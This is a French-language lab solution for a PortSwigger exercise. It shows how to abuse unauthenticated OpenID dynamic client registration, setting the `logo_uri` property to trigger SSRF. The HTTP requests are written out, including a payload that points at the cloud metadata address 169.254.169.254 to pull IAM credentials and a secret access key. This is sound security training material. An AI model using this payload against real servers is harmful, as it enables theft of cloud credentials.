# Lab

https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration

## Solution

En utilisant Burp pour analyser le trafic, commencez par vous connecter à votre propre compte. Visitez `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration` pour accéder au fichier de configuration. Notez que le point de terminaison d'enregistrement des clients se trouve à l'adresse `/reg`.

Créez ensuite une requête POST appropriée dans Burp Repeater pour enregistrer votre propre application cliente avec le service OAuth. Il est essentiel de fournir un tableau `redirect_uris` contenant une liste blanche arbitraire d'URI de rappel pour votre fausse application. Par exemple :

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```

Envoyez la requête et observez que vous avez réussi à enregistrer votre propre application cliente sans nécessiter d'authentification. La réponse contient divers métadonnées associées à votre nouvelle application cliente, y compris un nouveau `client_id`.

En utilisant Burp, examinez le flux OAuth et remarquez que la page "Autoriser", où l'utilisateur donne son consentement aux permissions demandées, affiche le logo de l'application cliente. Ce logo est récupéré depuis `/client/CLIENT-ID/logo`. Selon la spécification OpenID, les applications clientes peuvent fournir l'URL de leur logo via la propriété `logo_uri` lors de l'enregistrement dynamique. Envoyez la requête GET `/client/CLIENT-ID/logo` à Burp Repeater.

Dans Repeater, revenez à la requête POST `/reg` que vous avez créée précédemment. Ajoutez la propriété `logo_uri`. Faites un clic droit et sélectionnez "Insérer un payload Collaborator" pour coller une URL Collaborator en tant que valeur. La requête finale devrait ressembler à ceci :

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
}
```

Envoyez la requête pour enregistrer une nouvelle application cliente et copiez le `client_id` de la réponse.

Dans Repeater, allez à la requête GET `/client/CLIENT-ID/logo`. Remplacez le `CLIENT-ID` dans le chemin par le nouveau que vous venez de copier et envoyez la requête.

Allez dans l'onglet Collaborator et vérifiez les nouvelles interactions. Remarquez qu'il y a une interaction HTTP tentant de récupérer votre logo inexistant. Cela confirme que vous pouvez utiliser avec succès la propriété `logo_uri` pour susciter des requêtes du serveur OAuth.

Retournez à la requête POST `/reg` dans Repeater et remplacez la valeur actuelle de `logo_uri` par l'URL cible :

```
"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
```

Envoyez cette requête et copiez le nouveau `client_id` de la réponse.

Retournez à la requête GET `/client/CLIENT-ID/logo` et remplacez le `client_id` par le nouveau que vous venez de copier. Envoyez cette requête. Observez que la réponse contient les métadonnées sensibles de l'environnement cloud du fournisseur OAuth, y compris la clé d'accès secrète.

Utilisez le bouton "Soumettre la solution" pour soumettre la clé d'accès et résoudre le lab.